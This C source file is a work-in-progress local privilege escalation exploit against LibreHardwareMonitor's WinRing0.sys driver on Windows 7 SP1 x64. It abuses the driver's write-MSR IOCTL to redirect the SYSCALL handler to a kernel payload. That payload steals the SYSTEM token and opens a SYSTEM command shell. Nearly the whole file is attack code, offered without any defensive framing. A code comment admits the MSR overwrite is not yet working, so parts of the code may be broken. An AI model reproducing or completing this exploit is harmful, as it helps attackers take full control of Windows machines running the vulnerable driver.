#include "exploit.h"

unsigned long long nt_base_address = 0;

// Work In Progress...
int main(int argc, char** argv)
{
	WRITEMSR_INPUT_STRUCTURE input;
	HANDLE h_driver = CreateFileA(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long high_bits_address = 0, low_bits_address = 0, bytes_returned = 0;
	unsigned char unused = 0, output[2048];

	RtlSecureZeroMemory(&output, sizeof(output));
	RtlSecureZeroMemory(&input, sizeof(input));

	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

	SetConsoleTitleA("LibreHardwareMonitor WinRing0.sys Elevation of Privilege");

	printf("[*] LibreHardwareMonitor WinRing0.sys 'wrmsr' Instruction Elevation of Privilege Vulnerability\n[*] Tested successfully on Windows 7 SP1 Build 7601 x64\n[*] Exploit written by ExAllocatePool2\n[!] Let's exploit!\n[*] Racing to obtain a device driver handle...");

	while (h_driver == (HANDLE)-1)
	{
		h_driver = CreateFileA(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	}
	printf("\n[+] Obtained a handle to the vulnerable device driver. Handle Value: 0x%p", h_driver);

	nt_base_address = (unsigned long long)leak_ntoskrnl_base_address();
	if (!nt_base_address)
	{
		return 1;
	}

	input.Register = SYSCALL_MSR;
	input.Address = kernel_payload;

	printf("\n[+] Crafted the input structure.\n<---------------- | Entering Danger Zone | ---------------->\n[!] Triggering MSR overwrites and payload execution in 3...");
	for (int i = 2; i > 0; i--)
	{
		Sleep(1000);
		printf("\n[!] %d...", i);
	}
	Sleep(1000);

	DeviceIoControl(h_driver, IOCTL_WRITE_MSR, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0); // TODO: Figure out why the hell the MSR is not being overwritten.
	FlashWindow(GetConsoleWindow(), 0);

	printf("\n<---------------- | Leaving Danger Zone | ---------------->\n[+] Spawned a \"nt authority\\system\" shell.\n[+] Exploitation complete.\n[>] Press \"ENTER\" to exit...");
	system("start C:\\Windows\\System32\\cmd.exe");
	unused = getchar();
	return 0;
}

NTSTATUS kernel_payload()
{
	// Initialization

	MmGetSystemRoutineAddress _MmGetSystemRoutineAddress = nt_base_address + MMGETSYSTEMROUTINEADDRESS_OFFSET_WIN7SP1X64;
	RtlInitUnicodeString _RtlInitUnicodeString = nt_base_address + RTLINITUNICODESTRING_OFFSET_WIN7SP1X64;

	UNICODE_STRING PsGetCurrentProcessId_string;
	UNICODE_STRING PsLookupProcessByProcessId_string;
	UNICODE_STRING PsReferencePrimaryToken_string;
	UNICODE_STRING PsDereferencePrimaryToken_string;
	UNICODE_STRING ObfDereferenceObject_string;

	_RtlInitUnicodeString(&PsGetCurrentProcessId_string, L"PsGetCurrentProcessId");
	_RtlInitUnicodeString(&PsLookupProcessByProcessId_string, L"PsLookupProcessByProcessId");
	_RtlInitUnicodeString(&PsReferencePrimaryToken_string, L"PsReferencePrimaryToken");
	_RtlInitUnicodeString(&PsDereferencePrimaryToken_string, L"PsDereferencePrimaryToken");
	_RtlInitUnicodeString(&ObfDereferenceObject_string, L"ObfDereferenceObject");

	PsGetCurrentProcessId _PsGetCurrentProcessId = _MmGetSystemRoutineAddress(&PsGetCurrentProcessId_string);
	PsLookupProcessByProcessId _PsLookupProcessByProcessId = _MmGetSystemRoutineAddress(&PsLookupProcessByProcessId_string);
	PsReferencePrimaryToken _PsReferencePrimaryToken = _MmGetSystemRoutineAddress(&PsReferencePrimaryToken_string);
	PsDereferencePrimaryToken _PsDereferencePrimaryToken = _MmGetSystemRoutineAddress(&PsDereferencePrimaryToken_string);
	ObfDereferenceObject _ObfDereferenceObject = _MmGetSystemRoutineAddress(&ObfDereferenceObject_string);

	// Payload

	PVOID current_process = 0, system_process = nt_base_address + PSINITIALSYSTEMPROCESS_OFFSET_WIN7SP1X64;

	_PsLookupProcessByProcessId(_PsGetCurrentProcessId(), &current_process);

	PACCESS_TOKEN current_token = _PsReferencePrimaryToken(current_process), system_token = _PsReferencePrimaryToken(system_process);
	ULONG_PTR* test_address = 0;
	PACCESS_TOKEN* token_address = 0, probable_token = 0;

	test_address = (ULONG_PTR*)((ULONG_PTR)(current_process)+(ULONG_PTR)EPROCESS_TOKEN_OFFSET_WIN7SP1X64);
	probable_token = (PACCESS_TOKEN)(*test_address & (ULONG_PTR)(-0xF));
	token_address = (PACCESS_TOKEN*)(test_address);
	*token_address = system_token;

	_PsDereferencePrimaryToken(current_token);
	_PsDereferencePrimaryToken(system_token);
	_ObfDereferenceObject(current_process);

	__writemsr(SYSCALL_MSR, nt_base_address + SYSTEM_SERVICE_CALL_TABLE_OFFSET_WIN7SP1X64);

	return 0;
}